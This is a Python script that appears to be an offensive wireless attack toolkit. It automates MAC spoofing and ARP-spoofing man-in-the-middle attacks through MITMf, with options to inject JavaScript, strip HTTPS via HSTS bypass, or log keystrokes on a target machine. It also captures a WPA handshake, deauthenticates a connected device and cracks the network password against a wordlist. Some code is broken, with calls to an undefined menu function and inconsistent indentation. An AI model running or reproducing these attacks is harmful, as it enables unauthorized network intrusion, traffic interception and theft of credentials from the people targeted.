# -*- coding: UTF-8 -*-
import os
import signal
import subprocess


def setup(wireless):
	# Sets up monitor mode. Checks for control c interupt to return to options menu
	try:
		print("\nSetting up monitor mode..\n")
		os.system("airmon-ng check kill")
		os.system("/etc/init.d/avahi-daemon stop")
		os.system("ifconfig wlan0 down")
		os.system("airmon-ng start wlan0")
		return
	except KeyboardInterrupt:
		print ("Wireless setup failed. Please try again")
		project_options()

def airodump():
	# Run airodump and check to make sure it actually executes
	# Waits on control c to return
	try:
		output = subprocess.check_output(['airodump-ng', 'wlan0mon', '--enc', 'OPN'])
	except subprocess.CalledProcessError as e:
		print("\nNo wlan0mon wireless adapter found \
			\nreturning..")
		project_options()
	except KeyboardInterrupt:
		print ("\n")

	mac = raw_input("\nEnter MAC address to spoof\n")

	os.system("airmon-ng stop wlan0mon")
	os.system("ifconfig wlan0 down")

	os.system("macchanger -m %s wlan0" %mac)
	os.system("ifconfig wlan0 up")

	print("\nMAC address spoofed to %s!\n" %mac)

def install_mitmf():
	# Automatically tries to install mitmf. Could implement check
	print ("\nAttempting to install mitmf...\n")
	os.system("apt-get install mitmf")
	os.system("apt-get install mitmflib")
	os.system("pip install Twisted==15.5.0")
	return

def find_interface():
	# Entering interface manually. Can be updated to read ifconfig 
	# automatically and use the interface
	os.system("ifconfig")
	interface = raw_input("\nWhat is your wireless interface?\n")
	return interface

def find_ip():
	# Entering ip address manually
	os.system("netstat -rn")
	ip = raw_input("\nPlease enter the router's ip address\n")
	print("\n")
	return ip

def mitmf_handler(interface, router_ip, target_ip):
	attack_input = "0"
	# endless loop?
	while not attack_input == "1" and not attack_input == "2" and not attack_input == "3":
		attack_input = raw_input("\n1) HTTP injecting\n" \
			"2) HTTPS injecting with --dns and --hsts\n" \
			"3) Keylogger\n\n" \
			"Please choose an attack number:\n")

	cmd = ""

	if (attack_input == "1"):
		js_file_path = create_js_file()
		js_file_path = os.getcwd() + "/" + js_file_path

		p = subprocess.Popen("mitmf -i %s --spoof --arp --gateway %s " \
			"--target %s --inject --js-file %s" %(interface, router_ip, target_ip, js_file_path), shell=True, preexec_fn=os.setsid)
		try:
    			p.wait()
		except KeyboardInterrupt:
    			try:
				print("\nReturning to Attack Options...\n")
       				os.killpg(os.getpgid(p.pid), signal.SIGTERM)
    			except OSError:
       				pass
    			p.wait()
			os.system("sleep 5")
			mitmf_handler(interface, router_ip, target_ip)
		#os.system("mitmf -i %s --spoof --arp --gateway %s " \
		#	"--target %s --inject --js-file %s" %(interface, router_ip, target_ip, js_file_path))

	elif (attack_input == "2"):
		js_file_path = create_js_file()
		js_file_path = os.getcwd() + "/" + js_file_path

		p = subprocess.Popen("mitmf -i %s --spoof --arp --dns --hsts --gateway " \
			"%s --target %s --inject --js-file %s" %(interface, router_ip, target_ip, js_file_path), shell=True, preexec_fn=os.setsid)
		try:
    			p.wait()
		except KeyboardInterrupt:
    			try:
				print("\nReturning to Attack Options...\n")
       				os.killpg(os.getpgid(p.pid), signal.SIGTERM)
    			except OSError:
       				pass
    			p.wait()
			os.system("sleep 5")
			mitmf_handler(interface, router_ip, target_ip)
		#os.system("mitmf -i %s --spoof --arp --dns --hsts --gateway " \
		#	"%s --target %s --inject --js-file %s" %(interface, router_ip, target_ip, js_file_path))

	elif (attack_input == "3"):
		p = subprocess.Popen("mitmf -i %s --spoof --arp --dns --hsts --gateway " \
			"%s --target %s --jskeylogger" %(interface, router_ip, target_ip), shell=True, preexec_fn=os.setsid)
		try:
    			p.wait()
		except KeyboardInterrupt:
    			try:
				print("\nReturning to Attack Options...\n")
       				os.killpg(os.getpgid(p.pid), signal.SIGTERM)
    			except OSError:
       				pass
    			p.wait()
			os.system("sleep 5")
			mitmf_handler(interface, router_ip, target_ip)
		#os.system("mitmf -i %s --spoof --arp --dns --hsts --gateway " \
		#	"%s --target %s --jskeylogger" %(interface, router_ip, target_ip))

	'''
	print cmd
	process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
	try:
		process.wait()
	except KeyboardInterrupt:
		print("\nProcess stopped")
	print process.returncode
	'''
	# Make sure to actually check if the attack is successful
	print("\n\n ATTACK COMPLETE \n\n")
	return

def main():
	interface = raw_input("\nWhat is your wireless interface? (wlan0, eth0, etc.)\n")

	try:
		output = subprocess.check_output(['airodump-ng', interface, '--enc', 'WPA2'])
	except subprocess.CalledProcessError as e:
		print("\nNo wlan0 wireless adapter found \
			\nreturning..")
		project_options()
	except KeyboardInterrupt:
		print ("\n")

	mac = raw_input("\nEnter MAC address of WPA Access Point\n")
	channel = raw_input("\nEnter channel of WPA Access Point\n")

	try:
		output = subprocess.check_output(['airodump-ng', '--bssid', mac, '-w', 'handshakecap', '--channel', channel, interface])
	except KeyboardInterrupt:
		print ("\n")
	os.system("sleep 5")

	mac_device = raw_input("\nEnter MAC address of device connected to network\n")

	try:
		output = subprocess.check_output(['aireplay-ng', '-0', '10', '-a', mac, '-c', mac_device, interface])
	except KeyboardInterrupt:
		print ("\n")

	os.system("aircrack-ng -w /usr/share/john/password.lst -b %s handshakecap.cap" %mac)
	return

if __name__ == "__main__":
	main()
